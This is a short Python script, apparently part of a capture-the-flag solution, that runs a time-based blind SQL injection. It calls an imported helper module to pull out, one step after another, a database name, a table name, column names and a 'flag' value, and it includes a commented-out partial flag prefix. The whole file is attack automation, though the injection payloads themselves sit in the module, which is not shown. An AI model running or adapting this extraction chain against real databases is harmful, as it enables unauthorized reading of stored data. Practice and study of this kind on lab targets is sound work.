import time_based


def try_time_based():
    print("\n=== Falling back to Time-based Blind SQLi ===")
    # length = time_based.get_db_length(30, delay=5, threshold=3)
    # if length is None:
    #     print("[-] Couldn't find db name length")
    #     return False
    
    db_name = time_based.extract_database_name(30, delay=5, threshold=3)
    if db_name is None:
        print("[-] Couldn't find db name")
        return False
    
    table_name = time_based.extract_table_name(db_name = db_name, length=30, delay=5, threshold=3)
    if table_name is None:
        print("[-] Couldn't find table")
        return False

    col1 = time_based.extract_column_name_by_offset(offset=0, length=30, table_name=table_name, delay=5, threshold=3)
    if col1 is None:
        print("[-] Couldn't find column")
        return False

    col2 = time_based.extract_column_name_by_offset(offset=1, length=30, table_name=table_name, delay=5, threshold=3)
    col_to_use = col1 if "flag" in col1 else col2

    flag = time_based.extract_flag_value(length=60, col_name=col_to_use, table_name=table_name, delay=5, threshold=3)
    if flag is None:
        print("[-] Couldn't find flag")
        return False

    # flag = time_based.extract_remained_flag_chars(length=60, col_name=col1, table_name=table_name, known_prefix='flag_8f691f4c5a0068d39ac7534', delay=5, threshold=3)
    if flag is None:
        print("[-] Couldn't find flag")
        return False

    print(f"\n🎯 flag: {flag}")
    return True
        